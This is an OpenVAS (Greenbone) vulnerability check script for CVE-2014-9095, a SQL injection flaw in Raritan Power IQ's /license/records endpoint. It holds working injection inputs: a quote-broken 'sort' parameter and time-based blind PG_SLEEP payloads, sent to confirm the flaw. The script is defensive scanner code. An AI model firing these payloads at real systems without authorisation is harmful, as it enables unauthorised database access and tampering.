###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_raritan_poweriq_sql_inj_vuln.nasl 13659 2019-02-14 08:34:21Z cfischer $
#
# Raritan Power IQ SQL Injection Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:raritan:power_iq";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105922");
  script_version("$Revision: 13659 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 09:34:21 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2014-08-15 16:50:19 +0700 (Fri, 15 Aug 2014)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_cve_id("CVE-2014-9095");
  script_bugtraq_id(68722);

  script_name("Raritan Power IQ SQL Injection Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_raritan_poweriq_detect.nasl");
  script_mandatory_keys("raritan_poweriq/detected");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Raritan Power IQ SQL Injection Vulnerability");

  script_tag(name:"vuldetect", value:"Tries to execute a time-based blind
  SQL injection and checks the response time.");

  script_tag(name:"insight", value:"Raritan PowerIQ is vulnerable to SQL injection.
  A remote attacker could send specially-crafted SQL statements to the /license/records
  script using the sort or dir parameter, which could allow the attacker to view, add,
  modify or delete information in the back-end database.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to
  inject or manipulate SQL queries in the back-end database, allowing for the manipulation
  or disclosure of arbitrary data.");

  script_tag(name:"affected", value:"Raritan Power IQ 4.2.2, 4.1.3 and below.");

  script_tag(name:"solution", value:"Install the patch from Raritan found in the references.");

  script_xref(name:"URL", value:"https://www.raritan.com/support/product/poweriq/security-patches");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jul/79");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/94717");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = "/license/records";
data = "sort=id&dir=ASC";
useragent = http_get_user_agent();

host = http_host_name(port:port);

req = string('POST ', url, ' HTTP/1.1\r\n',
             'Host: ', host, '\r\n',
             'User-Agent: ', useragent, '\r\n',
             'Content-Type: application/x-www-form-urlencoded\r\n',
             'Content-Length: ', strlen(data), '\r\n',
             'X-Requested-With: XMLHttpRequest\r\n',
             '\r\n',
             data);
start = unixtime();
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
stop = unixtime();

if (res !~ "HTTP/1.. 200 OK" || '"rows":' >!< res) {
  exit(0);
}

data = "sort=id'&dir=ASC";
req = string('POST ', url, ' HTTP/1.1\r\n',
             'Host: ', host, '\r\n',
             'User-Agent: ', useragent, '\r\n',
             'Content-Type: application/x-www-form-urlencoded\r\n',
             'Content-Length: ', strlen(data), '\r\n',
             'X-Requested-With: XMLHttpRequest\r\n',
             '\r\n',
             data);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if (res !~ "HTTP/1.. 500 Internal Server Error")
  exit(0);

# Execute time based check
latency = stop - start;

temp = 0;

foreach i (make_list(1, 3)) {
  data = "sort=(SELECT 5480 FROM PG_SLEEP(" + i + "))&dir=ASC";
  req =  string('POST ', url, ' HTTP/1.1\r\n',
                'Host: ', host, '\r\n',
                'User-Agent: ', useragent, '\r\n',
                'Content-Type: application/x-www-form-urlencoded\r\n',
                'Content-Length: ', strlen(data), '\r\n',
                'X-Requested-With: XMLHttpRequest\r\n',
                '\r\n',
                data);

  start = unixtime();
  res = http_keepalive_send_recv(port:port, data:req);
  stop = unixtime();

  if (stop - start < i || stop - start > (i+5+latency))
    exit(0);
  else
   temp += 1;
}

if (temp == 2) {
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit( 0 );
}

exit( 99 );
